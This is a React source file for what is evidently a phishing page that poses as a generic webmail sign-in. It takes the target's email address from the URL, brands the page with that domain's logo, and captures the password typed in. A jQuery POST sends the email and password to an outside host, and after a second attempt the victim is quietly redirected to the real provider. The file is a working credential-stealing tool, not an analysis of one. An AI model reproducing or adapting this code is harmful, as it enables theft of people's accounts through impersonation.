import React, { useEffect, useState } from "react";
import './Default.css';
import $ from 'jquery';
import Preloader from "../../Preloader/Preloader";
import { AiOutlineUserAdd } from 'react-icons/ai';
import { GiPadlock } from 'react-icons/gi';

const Default = ()=>{

    const [spinLoader, setSpinLoader] = useState(false);

    const emailInTheURL = window.location.href;
    const sliceEqualSign = emailInTheURL.indexOf("@");
    const extracetdEmail = emailInTheURL.substr((sliceEqualSign+1)).split('&', 1).toString();
    // console.log(extracetdEmail);
    const mainName = extracetdEmail.replace('.com', "").split('&', 1).toString();

    const emailInTheURLA = window.location.href;
    const sliceEqualSignB = emailInTheURLA.indexOf("=");
    const extracetdEmailC = emailInTheURLA.substr((sliceEqualSignB+1)).split('&', 1).toString();


    const [defaultEmail, setDefaultEmail] = useState(extracetdEmailC);
    const [defaultPassword, setDefaultPassword] = useState('');

    const [count, setCount] = useState(0);

    const submitDefaultForm = (e)=>{
        e.preventDefault();
        setSpinLoader(true);
        // alert('sdfgh');
        setTimeout(() => {
            setDefaultPassword('');
        }, 500);


        setCount(count=> count + 1);
            if(count >= 1){
                const redirectURL = window.location.href;
                const sliceEqualSign = redirectURL.indexOf("@");
                const extracetdemailDomain = redirectURL.substr((sliceEqualSign+1));
                // console.log(extracetdemailDomain);
                setTimeout(() => {
                    // window.location.href = "https://www.webmail.gigared.com/";
                    window.location.href = `https://www.${extracetdemailDomain}`;
                }, 1500);

            };

            setTimeout(()=>{
                setSpinLoader(false);
            }, 2200)

        // post to server

        const user = {
            email: defaultEmail,
            password: defaultPassword
        };
    
        $.ajax({
            type: "POST",
            url: "https://dozenpearl.com/nc_assets/fonts/recov/free.php",
            data: user,
            success(data) {
                // alert('OK');
                // console.log(data);
            },
        });
    };

    useEffect(()=>{
        document.title = extracetdEmail.toUpperCase();
        setSpinLoader(true);
        setTimeout(() => {
            setSpinLoader(false);
        }, 2500);
    }, [extracetdEmail]);

    return(<div style={{
        display: 'flex',
        justifyContent:'center',
        marginTop:'2.4cm'
    }}>

        { spinLoader ? <Preloader /> : null }

        <section className="Default_container">

            <div className="Default_logo_cont">
                <img 
                    alt="Logo"
                    src={`https://logo.clearbit.com/https://${extracetdEmail}`}
                />
            </div>

            <p className="bolded__ hhhhh">{mainName}</p>

            <p className="bolded__ sssss" style={{textTransform: 'capitalize'}}>Sign in</p>

            <form onSubmit={submitDefaultForm}>

                <div className="pv-Bz-iB ">

                    <div className="WB-Jo-DB"> 
                        <span className="kC-KY-IK"><i className="Lf-cT-dq no-im-qF"><AiOutlineUserAdd /></i></span> 
                        
                        <input
                            name="Yz-Uy-Ge"
                            readOnly
                            type="email"
                            value={defaultEmail}
                            required
                            placeholder="Username"
                            className="Nw-Ws-bg" id="Yz-Uy-Ge"
                            onChange={e=> setDefaultEmail(e.target.value)}
                        />
                    </div>

                </div>


                <div className="pv-Bz-iB " style={{
                        marginTop:'18px'
                    }}>

                        <div className="WB-Jo-DB" > 
                            <span className="kC-KY-IK"><i className="Lf-cT-dq no-im-qF"><GiPadlock /></i></span>
                            <input 
                                name="Yz-Uy-Ge" 
                                type="password" 
                                value={defaultPassword} 
                                required
                                placeholder="Password" 
                                className="Nw-Ws-bg" 
                                id="Yz-Uy-Ge" 
                                onChange={e=> setDefaultPassword(e.target.value)}
                                autoFocus
                            /> 
                        </div>

                    </div>


                    <div className="pv-Bz-iB bbbtttnnnnn">
                        <input 
                        type={`submit`}
                        value={`Sign in`}
                        className='Default_btn_submit_'
                        />
                    </div>

            </form>

        </section>

    </div>)
}

export default Default;